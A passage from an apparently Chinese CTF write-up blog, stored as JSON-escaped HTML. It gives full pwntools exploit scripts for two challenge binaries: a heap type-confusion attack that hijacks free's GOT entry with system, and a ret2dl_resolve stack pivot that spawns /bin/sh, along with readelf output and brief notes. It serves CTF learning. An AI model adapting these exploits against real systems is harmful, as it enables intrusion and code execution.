title=\"完整exp\"></a>完整exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"&gt; \"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"data:\\n\"</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"&gt; \"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"index: \"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"&gt; \"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"index: \"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"&gt; \"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"index: \"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"string\">\"/bin/sh\\x00\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>) <span class=\"comment\"># head is 1</span></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">main_arena = addr - <span class=\"number\">88</span></span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">\"free\"</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># make type confusion</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\">free(<span class=\"number\">5</span>)</span><br><span class=\"line\">free(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"c\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># hijack got</span></span><br><span class=\"line\">payload = p32(<span class=\"number\">6</span>) + p32(<span class=\"number\">0x10</span>) + p64(free_got)</span><br><span class=\"line\">change(<span class=\"number\">4</span>, payload + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">change(<span class=\"number\">6</span>, p64(system) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-baby-pwn\"><a href=\"#0x03-baby-pwn\" class=\"headerlink\" title=\"0x03  baby_pwn\"></a>0x03  baby_pwn</h2><h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>就是re2dl_resolve。</p>\n<p>直接修改XDCTF2015的exp即可。</p>\n<p>步骤有：</p>\n<ol>\n<li>找ppp、popebp、leave;ret等作stack pivoting的gadget；</li>\n<li>找到plt段，rel_plt段，dynsym段，dynstr等段的地址</li>\n<li>构造即可rel_plt重定位到dynsym表。</li>\n</ol>\n<p>readelf的使用如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/baby_pwn$ readelf -S pwn</span><br><span class=\"line\">There are 31 section headers, starting at offset 0x18b0:</span><br><span class=\"line\"></span><br><span class=\"line\">Section Headers:</span><br><span class=\"line\">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class=\"line\">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class=\"line\">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class=\"line\">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class=\"line\">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class=\"line\">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4</span><br><span class=\"line\">  [ 5] .dynsym           DYNSYM          080481dc 0001dc 0000a0 10   A  6   1  4</span><br><span class=\"line\">  [ 6] .dynstr           STRTAB          0804827c 00027c 00006c 00   A  0   0  1</span><br><span class=\"line\">  [ 7] .gnu.version      VERSYM          080482e8 0002e8 000014 02   A  5   0  2</span><br><span class=\"line\">  [ 8] .gnu.version_r    VERNEED         080482fc 0002fc 000020 00   A  6   1  4</span><br><span class=\"line\">  [ 9] .rel.dyn          REL             0804831c 00031c 000020 08   A  5   0  4</span><br><span class=\"line\">  [10] .rel.plt          REL             0804833c 00033c 000020 08  AI  5  24  4</span><br><span class=\"line\">  [11] .init             PROGBITS        0804835c 00035c 000023 00  AX  0   0  4</span><br><span class=\"line\">  [12] .plt              PROGBITS        08048380 000380 000050 04  AX  0   0 16</span><br><span class=\"line\">  [13] .plt.got          PROGBITS        080483d0 0003d0 000008 00  AX  0   0  8</span><br><span class=\"line\">  [14] .text             PROGBITS        080483e0 0003e0 000202 00  AX  0   0 16</span><br><span class=\"line\">  [15] .fini             PROGBITS        080485e4 0005e4 000014 00  AX  0   0  4</span><br><span class=\"line\">  [16] .rodata           PROGBITS        080485f8 0005f8 000008 00   A  0   0  4</span><br><span class=\"line\">  [17] .eh_frame_hdr     PROGBITS        08048600 000600 00003c 00   A  0   0  4</span><br><span class=\"line\">  [18] .eh_frame         PROGBITS        0804863c 00063c 00010c 00   A  0   0  4</span><br><span class=\"line\">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class=\"line\">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class=\"line\">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class=\"line\">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class=\"line\">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class=\"line\">  [24] .got.plt          PROGBITS        0804a000 001000 00001c 04  WA  0   0  4</span><br><span class=\"line\">  [25] .data             PROGBITS        0804a01c 00101c 000008 00  WA  0   0  4</span><br><span class=\"line\">  [26] .bss              NOBITS          0804a040 001024 00002c 00  WA  0   0 32</span><br><span class=\"line\">  [27] .comment          PROGBITS        00000000 001024 000035 01  MS  0   0  1</span><br><span class=\"line\">  [28] .shstrtab         STRTAB          00000000 0017a5 00010a 00      0   0  1</span><br><span class=\"line\">  [29] .symtab           SYMTAB          00000000 00105c 0004c0 10     30  47  4</span><br><span class=\"line\">  [30] .strtab           STRTAB          00000000 00151c 000289 00      0   0  1</span><br><span class=\"line\">Key to Flags:</span><br><span class=\"line\">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class=\"line\">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class=\"line\">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-3\"><a href=\"#利用-3\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"完整exp：\"><a href=\"#完整exp：\" class=\"headerlink\" title=\"完整exp：\"></a>完整exp：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./pwn'</span>)</span><br><span class=\"line\">offset = <span class=\"number\">44</span></span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">'read'</span>]</span><br><span class=\"line\"><span class=\"comment\"># write_plt = elf.plt['write']</span></span><br><span class=\"line\"></span><br><span class=\"line\">ppp_ret = <span class=\"number\">0x080485d9</span> <span class=\"comment\"># 0x080485d9 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class=\"line\">pop_ebp_ret = <span class=\"number\">0x080485db</span> <span class=\"comment\"># 0x080485db : pop ebp ; ret</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x08048448</span>\t <span class=\"comment\"># 0x08048448 : leave ; ret</span></span><br><span class=\"line\"></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x0804a040</span> <span class=\"comment\"># readelf -S bof | grep \".bss\"</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">'./pwn'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">'A'</span> * offset</span><br><span class=\"line\">payload += p32(read_plt) </span><br><span class=\"line\">payload += p32(ppp_ret)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(base_stage)</span><br><span class=\"line\">payload += p32(<span class=\"number\">100</span>)</span><br><span class=\"line\">payload += p32(pop_ebp_ret) </span><br><span class=\"line\">payload += p32(base_stage)</span><br><span class=\"line\">payload += p32(leave_ret) </span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">cmd = <span class=\"string\">\"/bin/sh\"</span></span><br><span class=\"line\">plt_0 = <span class=\"number\">0x08048380</span></span><br><span class=\"line\">rel_plt = <span class=\"number\">0x0804833c</span></span><br><span class=\"line\">index_offset = (base_stage + <span class=\"number\">28</span>) - rel_plt</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">'read'</span>]</span><br><span class=\"line\">dynsym = <span class=\"number\">0x080481dc</span></span><br><span class=\"line\">dynstr = <span class=\"number\">0x0804827c</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">36</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span>)</span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (fake_sym_addr - dynsym) / <span class=\"number\">0x10</span></span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_reloc = p32(read_got) + p32(r_info)</span><br><span class=\"line\">st_name = (fake_sym_addr + <span class=\"number\">0x10</span>) - dynstr</span><br><span class=\"line\">fake_sym = p32(st_name) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">'AAAA'</span></span><br><span class=\"line\">payload2 += p32(plt_0)</span><br><span class=\"line\">payload2 += p32(index_offset)</span><br><span class=\"line\">payload2 += <span class=\"string\">'AAAA'</span></span><br><span class=\"line\">payload2 += p32(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">payload2 += <span class=\"string\">'aaaa'</span></span><br><span class=\"line\">payload2 += <span class=\"string\">'aaaa'</span></span><br><span class=\"line\">payload2 += fake_reloc </span><br><span class=\"line\">payload2 += <span class=\"string\">'B'</span> * align</span><br><span class=\"line\">payload2 += fake_sym </span><br><span class=\"line\">payload2 += <span class=\"string\">\"system\\x00\"</span></span><br><span class=\"line\">payload2 += <span class=\"string\">'A'</span> * (<span class=\"number\">80</span> - len(payload2))</span><br><span class=\"line\">payload2 += cmd + <span class=\"string\">'\\x00'</span></span><br><span class=\"line\">payload2 += <span class=\"string\">'A'</span> * (<span class=\"number\">100</span> - len(payload2))</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x04-BMS\"><a href=\"#0x04-BMS\" class=\"headerlink\" title=\"0x04 BMS\"></a>0x04 BMS</h2>","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]}